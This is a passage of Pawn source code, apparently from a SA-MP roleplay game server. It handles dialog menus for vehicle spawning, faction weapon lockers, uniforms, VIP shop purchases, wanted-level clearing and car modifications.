                 	Player[playerid][vVVVLocked] = 1;
                 	Player[playerid][vVVVModel] = carid;
             		GetVehiclePos(Player[playerid][pVVVVeh], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
            		GetVehicleZAngle(Player[playerid][pVVVVeh], Player[playerid][vVVVA]);
            		Player[playerid][vVVVC1] = 0;
            		Player[playerid][vVVVC2] = 0;
            	}
				return 1;
	        }
	        if(Player[playerid][vModel] && Player[playerid][vVModel])
	        {
                if(Player[playerid][pLevel] >= 10)
				{
	                Player[playerid][pVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	    	        SetVehicleParamsEx(Player[playerid][pVVVeh], 0, 0, 0, 0, 0, 0, 0);
	    	        Player[playerid][vVVLocked] = 0;
	    	        Player[playerid][vVVModel] = carid;
	    			GetVehiclePos(Player[playerid][pVVVeh], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
		    		GetVehicleZAngle(Player[playerid][pVVVeh], Player[playerid][vVVA]);
		    		Player[playerid][vVVC1] = 0;
		    		Player[playerid][vVVC2] = 0;
		    	}
				return 1;
	        }
	        if(Player[playerid][vModel])
	        {
				if(Player[playerid][pLevel] >= 2)
				{
	                Player[playerid][pVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
     		        SetVehicleParamsEx(Player[playerid][pVVeh], 0, 0, 0, 0, 0, 0, 0);
     		        Player[playerid][vVLocked] = 0;
    		        Player[playerid][vVModel] = carid;
    				GetVehiclePos(Player[playerid][pVVeh], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
	    			GetVehicleZAngle(Player[playerid][pVVeh], Player[playerid][vVA]);
	    			Player[playerid][vVC1] = 0;
		    		Player[playerid][vVC2] = 0;
				}
				return 1;
	        }
	        Player[playerid][pVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	        SetVehicleParamsEx(Player[playerid][pVeh], 0, 0, 0, 0, 0, 0, 0);
	        Player[playerid][vLocked] = 0;
	        Player[playerid][vModel] = carid;
			GetVehiclePos(Player[playerid][pVeh], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
			GetVehicleZAngle(Player[playerid][pVeh], Player[playerid][vA]);
			Player[playerid][vC1] = 0;
			Player[playerid][vC2] = 0;
	    }
	}
	else if(dialogid == 43)
	{
	    new string[256];
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // Nightstick
				{
				   // if(Player[playerid][pMoney] < 50) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    GiveZamoraWeapon(playerid, 3, 1);
				    //TaxMoney += 50;
				    //GiveZamoraMoney(playerid, -50);
                    format(string, sizeof(string), "* %s grabs a Nightstick from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 1: // Mace
				{
				   // if(Player[playerid][pMoney] < 100) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    GiveZamoraWeapon(playerid, 41, 500);
				    //TaxMoney += 100;
				    //GiveZamoraMoney(playerid, -100);
                    format(string, sizeof(string), "* %s grabs a Mace from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 2: // Desert EAgle
				{
				    //if(Player[playerid][pMoney] < 200) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    GiveZamoraWeapon(playerid, 24, 500);
				   // TaxMoney += 200;
				   // GiveZamoraMoney(playerid, -200);
                    format(string, sizeof(string), "* %s grabs a Desert Eagle from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 3: // Shotgun
				{
				    //if(Player[playerid][pMoney] < 100) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    GiveZamoraWeapon(playerid, 25, 200);
				  //  TaxMoney += 100;
				    //GiveZamoraMoney(playerid, -100);
                    format(string, sizeof(string), "* %s grabs a Shotgun from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 4: // MP5
				{
				   // if(Player[playerid][pMoney] < 600) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    GiveZamoraWeapon(playerid, 29, 500);
				    //TaxMoney += 600;
				   // GiveZamoraMoney(playerid, -600);
                    format(string, sizeof(string), "* %s grabs an MP5 from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 5: // M4
				{
				   // if(Player[playerid][pMoney] < 1000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    GiveZamoraWeapon(playerid, 31, 500);
				    //TaxMoney += 1000;
				  //  GiveZamoraMoney(playerid, -1000);
                    format(string, sizeof(string), "* %s grabs an M4 from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 6: // Combat Shotgun
				{
				  //  if(Player[playerid][pMoney] < 1500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    GiveZamoraWeapon(playerid, 27, 200);
				    //TaxMoney += 1500;
				    //GiveZamoraMoney(playerid, -1500);
                    format(string, sizeof(string), "* %s grabs a Combat Shotgun from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 7: // Sniper Rifle
				{
				    //if(Player[playerid][pMoney] < 2500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    GiveZamoraWeapon(playerid, 34, 100);
				    //TaxMoney += 2500;
				    //GiveZamoraMoney(playerid, -2500);
                    format(string, sizeof(string), "* %s grabs a Sniper Rifle from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 8: // PainKiller
				{
				   // if(Player[playerid][pMoney] < 100) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    SetPlayerHealth(playerid, 100);
                   // TaxMoney += 100;
				   // GiveZamoraMoney(playerid, -100);
                    format(string, sizeof(string), "* %s grabs a painkiller from the locker and swallows it.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 9: // Vest
				{
				    //if(Player[playerid][pMoney] < 200) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    SetPlayerArmour(playerid, 100);
				    //TaxMoney += 300;
				  //  GiveZamoraMoney(playerid, -200);
                    format(string, sizeof(string), "* %s grabs a vest from the locker and puts it on.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 10: // Grenade
				{
				    //if(Player[playerid][pMoney] < 200) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    //TaxMoney += 300;
				    if(Player[playerid][pFacRank] < 4) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to use this weapon. (Rank 4+)");
				    GiveZamoraWeapon(playerid, 16, 5);
				  //  GiveZamoraMoney(playerid, -200);
                    format(string, sizeof(string), "* %s grabs a 5 grenades from the locker and puts it on.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 11: // County Ridle
				{
				    //if(Player[playerid][pMoney] < 200) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    //TaxMoney += 300;
				  //  if(Player[playerid][pFacRank] < 4) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to use this command. (Rank 4+)");
				    GiveZamoraWeapon(playerid, 33, 20);
				  //  GiveZamoraMoney(playerid, -200);
                    format(string, sizeof(string), "* %s grabs a county rifle from the locker and puts it on.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 12: // Ak47
				{
				    //if(Player[playerid][pMoney] < 200) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				    //TaxMoney += 300;
				   // if(Player[playerid][pFacRank] < 4) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to use this command. (Rank 4+)");
				    GiveZamoraWeapon(playerid, 30, 500);
				  //  GiMoney(playerid, -200);
                    format(string, sizeof(string), "* %s grabs a ak-47 from the locker and puts it on.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
	        }
	    }
	}
	if(dialogid == 44)
	{
 		if(response)
		{
			if(listitem == 0) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 71);
				Player[playerid][pModel] = 71;
			}
			if(listitem == 1) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 306);
				Player[playerid][pModel] = 306;
			}
			if(listitem == 2) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 307);
				Player[playerid][pModel] = 307;
			}
			if(listitem == 3) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 280);
				Player[playerid][pModel] = 280;
			}
			if(listitem == 4) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 266);
				Player[playerid][pModel] = 266;
			}
			if(listitem == 5) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 281);
				Player[playerid][pModel] = 281;
			}
			if(listitem == 6) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 265);
				Player[playerid][pModel] = 265;
			}

			if(listitem == 7) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 267);
				Player[playerid][pModel] = 267;
			}
			if(listitem == 8) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 284);
				Player[playerid][pModel] = 284;
			}
			if(listitem == 9) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 285);
				Player[playerid][pModel] = 285;
			}
			if(listitem == 10) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 282);
				Player[playerid][pModel] = 282;
			}
			if(listitem == 11) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 283);
				Player[playerid][pModel] = 283;
			}
			if(listitem == 12) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 288);
				Player[playerid][pModel] = 288;
			}
		}
	}
	if(dialogid == 45)
	{
	    if(response)
    	{
			new string[256];
            new giveplayerid = ReturnUser(inputtext);
			//giveplayerid = strval(inputtext);
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
					format(string, sizeof(string), "* %s %s has cleared your records and wanted points.", RPFRN(playerid), GetName(playerid));
					SendClientMessage(giveplayerid, COLOR_BLUE, string);
					format(string, sizeof(string), "* %s %s has cleared %s's records and wanted points.", RPFRN(playerid), GetName(playerid), GetName(giveplayerid));
					SendCopMessage(COLOR_BLUE, string);
					SendFBIMessage(COLOR_FBI, string);
					Player[giveplayerid][pWanted] = 0;
				    SetPlayerWantedLevel(giveplayerid, 0);
        			ClearZamoraWantedLevels(giveplayerid);
				}
				else
				{
					NoLoginB(playerid);
				}
			}
		}
	}
	else if(dialogid == 46)
	{
	    new string[256];
	    if(response)
	    {
			new skin = strval(inputtext);
			if(skin < 0 || skin > 311)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Skin must be between 0 and 311.");
				ShowDialog(playerid, 46);
			}
			else
			{
				Player[playerid][pModel] = skin;
				SetPlayerSkin(playerid, skin);
				format(string, sizeof(string), "* %s puts on some clothes from the locker.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				return 1;
			}
	    }
	}
	else if(dialogid == 47)
	{
	    new string[128];
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(!Player[playerid][pFacDuty])
	                {
	                    Player[playerid][pFacDuty] = 1;
	                    format(string, sizeof(string), "* %s grabs their badge from the locker.", GetName(playerid));
						SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
						GiveZamoraWeapon(playerid, 42, 500);
						return 1;
	                }
	                else
	                {
      					Player[playerid][pFacDuty] = 0;
	                    format(string, sizeof(string), "* %s places their badge in the locker.", GetName(playerid));
						SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
						return 1;
	                }
	            }
	            case 1:
	            {
	                ShowDialog(playerid, 48);
	            }
	        }
	    }
	}
	if(dialogid == 48)
	{
 		if(response)
		{
			if(listitem == 0) // LSFMD Uniforms
			{
				SetPlayerSkin(playerid, 277);
				Player[playerid][pModel] = 277;
			}
			if(listitem == 1) // LSFMD Uniforms
			{
				SetPlayerSkin(playerid, 278);
				Player[playerid][pModel] = 278;
			}
			if(listitem == 2) // LSFMD Uniforms
			{
				SetPlayerSkin(playerid, 279);
				Player[playerid][pModel] = 279;
			}
			if(listitem == 3) // LSFMD Uniforms
			{
				SetPlayerSkin(playerid, 274);
				Player[playerid][pModel] = 274;
			}
			if(listitem == 4) // LSFMD Uniforms
			{
				SetPlayerSkin(playerid, 275);
				Player[playerid][pModel] = 275;
			}
			if(listitem == 5) // LSFMD Uniforms
			{
				SetPlayerSkin(playerid, 276);
				Player[playerid][pModel] = 276;
			}
			if(listitem == 6) // LSFMD Uniforms
			{
				SetPlayerSkin(playerid, 308);
				Player[playerid][pModel] = 308;
			}

		}
	}
	else if(dialogid == 49)
	{
		new string[256], days[256];
	    if(response)
	    {
		    switch(listitem)
		    {
	            case 0: // Good Day Creation
		        {
					if(DayRespect == 1 || DayNoShops == 1 || DayZeroGravity == 1 || DayPaycheck == 1 || DayUnbreakable == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You can't buy Good Day Creation while there is a day already created.");
                    if(Player[playerid][pMoney] < 150000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money to do this.");
                    RandomGoodDay();
                    GiveZamoraMoney(playerid, -150000);
                    format(string, sizeof(string), "MOLE: %s has donated $150000 for a Good Day Creation.", GetName(playerid));
                	SendClientMessageToAll(COLOR_VIP, string);
		        }
		        case 1: // Bad Day Removal
		        {
                    if(DayNoShops == 0 || DayZeroGravity == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't buy Bad Day Removal while there is no bad day.");
		            if(Player[playerid][pMoney] < 100000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money to do this.");
                	GiveZamoraMoney(playerid, -100000);
                	DayNoShops = 0;
                	DayZeroGravity = 0;
                	format(string, sizeof(string), "MOLE: %s has donated $100000 for a Bad Day Removal.", GetName(playerid));
                	SendClientMessageToAll(COLOR_VIP, string);
                	format(days, sizeof(days), "%s", SpecialDay());
                    TextDrawSetString(SPDNDDraw, days);
                }
             }
	    }
	}
	else if(dialogid == 50)
	{
		if(response)
		{
		    new string[256];
		    switch(listitem)
		    {
				case 0:
				{
				    if(FHealth)
				    {
				        format(string, sizeof(string), "You need to wait %d more hours (%d minutes) before refilling everybody's health.", FHealth/60, FHealth);
						SendClientMessage(playerid, COLOR_GRAD2, string);
				        return 1;
				    }
				    if(Player[playerid][pFamedPoints] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough famed points for this.");
				    foreach(Player, i)
				    {
				        SetPlayerHealth(i, 100);
				    }
				    format(string, sizeof(string), "FamedWarning: %s has used {FF9900}2 Famed Points {FF6347}to refill everybody's health.", GetName(playerid));
				    Player[playerid][pFamedPoints] -= 2;
				    FHealth = 120;
				}
				case 1:
				{
				    if(FFix)
				    {
				        format(string, sizeof(string), "You need to wait %d more hours (%d minutes) before repairing all vehicles.", FFix/60, FFix);
				        SendClientMessage(playerid, COLOR_GRAD2, string);
				        return 1;
				    }
				    if(Player[playerid][pFamedPoints] < 4) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough famed points for this.");
					for(new i=0; i<MAX_VEHICLES; i++)
					{
					    RepairVehicle(i);
					}
					format(string, sizeof(string), "FamedWarning: %s has used {FF9900}4 Famed Points {FF6347}to repair all vehicles.", GetName(playerid));
					Player[playerid][pFamedPoints] -= 4;
					FFix = 120;
				}
				case 2:
				{
				    if(FRefill)
				    {
				        format(string, sizeof(string), "You need to wait %d more hours (%d minutes) to refill everybody's health.", FRefill/60, FRefill);
				        SendClientMessage(playerid, COLOR_GRAD2, string);
				        return 1;
				    }
				    if(Player[playerid][pFamedPoints] < 6) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough famed points for this.");
					for(new i=0; i<MAX_VEHICLES; i++)
					{
					    Fuel[i] = 100;
					}
					format(string, sizeof(string), "FamedWarning: %s has used {FF9900}6 Famed Points {FF6347}to refill all vehicles.", GetName(playerid));
					Player[playerid][pFamedPoints] -= 6;
					FRefill = 120;
				}
		    }
		    SendClientMessageToAll(COLOR_LIGHTRED, string);
		}
	}
	else if(dialogid == 51) //vip vehicle model
	{
        if(response)
	    {
	        if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
			{
			    new model = strval(inputtext);
			    if(model < 400 || model > 611) return SendClientMessage(playerid, COLOR_GRAD2, "Vehicle IDs are between 400 and 611.");
			    if(model == 520) return SendClientMessage(playerid, COLOR_GRAD2, "You are entering a forbidden vehicle model.");
			    new Float:x ,Float:y, Float:z, Float:Angle;
			    DestroyVehicle(Player[playerid][pVeh]);
				GetPlayerPos(playerid, x, y, z);
				GetPlayerFacingAngle(playerid, Angle);
				Player[playerid][pVeh] = CreateVehicle(model, x ,y , z, Angle ,0 ,0 ,1200);
				GetVehiclePos(Player[playerid][pVeh], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
				GetVehicleZAngle(Player[playerid][pVeh], Player[playerid][vA]);
			   	Player[playerid][vModel] = model;
				Player[playerid][vC1] = 0;
				Player[playerid][vC2] = 0;
				PutPlayerInVehicle(playerid, Player[playerid][pVeh], 0);
			}
			if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
			{
			    new model = strval(inputtext);
			    if(model < 400 || model > 611) return SendClientMessage(playerid, COLOR_GRAD2, "Vehicle IDs are between 400 and 611.");
			    if(model == 520) return SendClientMessage(playerid, COLOR_GRAD2, "You are entering a forbidden vehicle model.");
			    new Float:x ,Float:y, Float:z, Float:Angle;
			    DestroyVehicle(Player[playerid][pVVeh]);
				GetPlayerPos(playerid, x, y, z);
				GetPlayerFacingAngle(playerid, Angle);
				Player[playerid][pVVeh] = CreateVehicle(model, x ,y , z, Angle ,0 ,0 ,1200);
				GetVehiclePos(Player[playerid][pVVeh], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
				GetVehicleZAngle(Player[playerid][pVVeh], Player[playerid][vVA]);
			   	Player[playerid][vVModel] = model;
				Player[playerid][vVC1] = 0;
				Player[playerid][vVC2] = 0;
				PutPlayerInVehicle(playerid, Player[playerid][pVVeh], 0);
			}
			if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
			{
			    new model = strval(inputtext);
			    if(model < 400 || model > 611) return SendClientMessage(playerid, COLOR_GRAD2, "Vehicle IDs are between 400 and 611.");
			    if(model == 520) return SendClientMessage(playerid, COLOR_GRAD2, "You are entering a forbidden vehicle model.");
			    new Float:x ,Float:y, Float:z, Float:Angle;
			    DestroyVehicle(Player[playerid][pVVVeh]);
				GetPlayerPos(playerid, x, y, z);
				GetPlayerFacingAngle(playerid, Angle);
				Player[playerid][pVVVeh] = CreateVehicle(model, x ,y , z, Angle ,0 ,0 ,1200);
				GetVehiclePos(Player[playerid][pVVVeh], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
				GetVehicleZAngle(Player[playerid][pVVVeh], Player[playerid][vVVA]);
			   	Player[playerid][vVVModel] = model;
				Player[playerid][vVVC1] = 0;
				Player[playerid][vVVC2] = 0;
				PutPlayerInVehicle(playerid, Player[playerid][pVVVeh], 0);
			}
			if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
			{
			    new model = strval(inputtext);
			    if(model < 400 || model > 611) return SendClientMessage(playerid, COLOR_GRAD2, "Vehicle IDs are between 400 and 611.");
			    if(model == 520) return SendClientMessage(playerid, COLOR_GRAD2, "You are entering a forbidden vehicle model.");
			    new Float:x ,Float:y, Float:z, Float:Angle;
			    DestroyVehicle(Player[playerid][pVVVVeh]);
				GetPlayerPos(playerid, x, y, z);
				GetPlayerFacingAngle(playerid, Angle);
				Player[playerid][pVVVVeh] = CreateVehicle(model, x ,y , z, Angle ,0 ,0 ,1200);
				GetVehiclePos(Player[playerid][pVVVVeh], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
				GetVehicleZAngle(Player[playerid][pVVVVeh], Player[playerid][vVVVA]);
			   	Player[playerid][vVVVModel] = model;
				Player[playerid][vVVVC1] = 0;
				Player[playerid][vVVVC2] = 0;
				PutPlayerInVehicle(playerid, Player[playerid][pVVVVeh], 0);
			}
	    }
	}
	else if(dialogid == 52) // Vip Special Weapons
	{
	    new string[128];
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // Deagle of extra damage
	            {
	                if(Player[playerid][pVIPPoints] < 15) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough VIP Points.");
	                if(Player[playerid][pSpecialWeapon] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can only carry one special weapon.");
	                Player[playerid][pVIPPoints] -= 15;
	                GiveZamoraWeapon(playerid, 24, 100);
	                Player[playerid][pSpecialWeapon] = 1;
	                format(string, sizeof(string), "** You have used 15 VIP points for a special weapon - Deagle of Extra Damage.");
				    SendClientMessage(playerid, COLOR_VIP, string);
	            }
	            case 1: // AK47 of extra health
	            {
	                if(Player[playerid][pVIPPoints] < 16) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough VIP Points.");
	                if(Player[playerid][pSpecialWeapon] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can only carry one special weapon.");
	                Player[playerid][pVIPPoints] -= 16;
	                GiveZamoraWeapon(playerid, 30, 100);
	                Player[playerid][pSpecialWeapon] = 2;
	                format(string, sizeof(string), "** You have used 16 VIP points for a special weapon - AK-47 of Extra Health.");
				    SendClientMessage(playerid, COLOR_VIP, string);
	            }
	            case 2: // M4 of extra armor
	            {
	                if(Player[playerid][pVIPPoints] < 17) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough VIP Points.");
	                if(Player[playerid][pSpecialWeapon] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can only carry one special weapon.");
	                Player[playerid][pVIPPoints] -= 17;
	                GiveZamoraWeapon(playerid, 31, 100);
	                Player[playerid][pSpecialWeapon] = 3;
	                format(string, sizeof(string), "** You have used 17 VIP points for a special weapon - M4 of Extra Armor.");
				    SendClientMessage(playerid, COLOR_VIP, string);
	            }
	            case 3: // SPAS12 of extra health & armor
	            {
	                if(Player[playerid][pVIPPoints] < 18) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough VIP Points.");
	                if(Player[playerid][pSpecialWeapon] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can only carry one special weapon.");
	                Player[playerid][pVIPPoints] -= 18;
	                GiveZamoraWeapon(playerid, 27, 100);
	                Player[playerid][pSpecialWeapon] = 4;
	                format(string, sizeof(string), "** You have used 18 VIP points for a special weapon - SPAS12 of Extra Health & Armor.");
				    SendClientMessage(playerid, COLOR_VIP, string);
	            }
	            case 4: // Sniper of sudden death
	            {
	                if(Player[playerid][pVIPPoints] < 20) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough VIP Points.");
	                if(Player[playerid][pSpecialWeapon] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can only carry one special weapon.");
	                Player[playerid][pVIPPoints] -= 20;
	                GiveZamoraWeapon(playerid, 34, 20);
	                Player[playerid][pSpecialWeapon] = 5;
	                format(string, sizeof(string), "** You have used 20 VIP points for a special weapon - Sniper of Sudden Death.");
				    SendClientMessage(playerid, COLOR_VIP, string);
	            }
			}
		}
	}
	else if(dialogid == 53)
	{
	    new string[128];
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(!Player[playerid][pFacDuty])
	                {
	                    Player[playerid][pFacDuty] = 1;
	                    format(string, sizeof(string), "* %s grabs their badge, and gun from the locker.", GetName(playerid));
						SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
						GiveZamoraWeapon(playerid, 24, 200);
						SetPlayerArmour(playerid, 100);
						return 1;
	                }
	                else
	                {
      					Player[playerid][pFacDuty] = 0;
	                    SetPlayerArmour(playerid, 0);
	                    format(string, sizeof(string), "* %s places their badge in the locker.", GetName(playerid));
						SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
						return 1;
	                }
	            }
	            case 1:
	            {
	                ShowDialog(playerid, 43);
	            }
	            case 2:
	            {
	                ShowDialog(playerid, 46);
	            }
	        }
	    }
	}
	if(dialogid == 54)
	{
 		if(response)
		{
			if(listitem == 0) // DOC Uniforms
			{
				SetPlayerSkin(playerid, 311);
				Player[playerid][pModel] = 311;
			}
			if(listitem == 1) // DOC Uniforms
			{
				SetPlayerSkin(playerid, 309);
				Player[playerid][pModel] = 309;
			}
			if(listitem == 2) // DOC Uniforms
			{
				SetPlayerSkin(playerid, 302);
				Player[playerid][pModel] = 302;
			}
			if(listitem == 3) // DOC Uniforms
			{
				SetPlayerSkin(playerid, 282);
				Player[playerid][pModel] = 282;
			}
		}
	}
	else if(dialogid == 55)
	{
	    new string[128];
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(!Player[playerid][pFacDuty])
	                {
	                    Player[playerid][pFacDuty] = 1;
	                    format(string, sizeof(string), "* %s grabs their badge, and gun from the locker.", GetName(playerid));
						SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
						GiveZamoraWeapon(playerid, 24, 200);
						GiveZamoraWeapon(playerid, 3, 1);
						GiveZamoraWeapon(playerid, 41, 200);
						SetPlayerArmour(playerid, 100);
						return 1;
	                }
	                else
	                {
      					Player[playerid][pFacDuty] = 0;
	                    SetPlayerArmour(playerid, 0);
	                    format(string, sizeof(string), "* %s places their badge in the locker.", GetName(playerid));
						SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
						return 1;
	                }
	            }
	            case 1:
	            {
	                ShowDialog(playerid, 54);
	            }
	        }
	    }
	}
	if(dialogid == DIALOG_ID)
    {
        if(!response)
            return 0;

        if(FloorRequestedBy[listitem] != INVALID_PLAYER_ID || IsFloorInQueue(listitem))
            GameTextForPlayer(playerid, "~r~The floor is already in the queue", 3500, 4);
		else if(DidPlayerRequestElevator(playerid))
		    GameTextForPlayer(playerid, "~r~You already requested the elevator", 3500, 4);
		else
	        CallElevator(playerid, listitem);

		return 1;
    }
    else if(dialogid == 1111 && response)
	{
		switch(listitem)
		{
			case 0: AddVehicleComponent(vehid,1010),CarmodDialog(playerid), PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
			case 1: ShowPlayerDialog(playerid,1112,DIALOG_STYLE_LIST,"Choose primary color:","White\nBlack\nOrange\nLight Blue\nDark Blue\nPurple\nRed\nDark Red\nGrey","Select","Cancle");
			case 2: ShowPlayerDialog(playerid,1113,DIALOG_STYLE_LIST,"Choose a wheel:","Shadow\nMega\nRimshine\nWires\nClassic\nTwist\nCutter\nSwitch\nGrove\nImport\nDollar\nTrance\nAtomic\nAhab\nVirtual\nAcces\n{FF0000}Back","Select","Cancle");
			case 3: AddVehicleComponent(vehid, 1086), PlayerPlaySound(playerid,1133,0.0,0.0,0.0), CarmodDialog(playerid);
			case 4: AddVehicleComponent(vehid, 1087), PlayerPlaySound(playerid,1133,0.0,0.0,0.0), CarmodDialog(playerid);
			case 5:
			{
				if(vehmd == 562 || vehmd == 565 || vehmd == 559 || vehmd == 561 || vehmd == 560 || vehmd == 558)
				{
					ShowPlayerDialog(playerid,1114,DIALOG_STYLE_LIST,"Choose one","Paintjob\nAlien\nX-Flow\n{FF0000}Back","Select","Cancel");
				}
				else if(vehmd == 576 || vehmd == 575 || vehmd == 535)
				{
					Lowrider(playerid);
    			}
				else if(vehmd == 567 || vehmd == 536)
				{
                    ShowPlayerDialog(playerid,1002,DIALOG_STYLE_LIST,"Choose one","Paintjob\nChrome\nSlamin\nHardtop Roof\nSofttop Roof\n{FF0000}Back","Select","Cancel");
				}
				else if(vehmd == 534)
				{
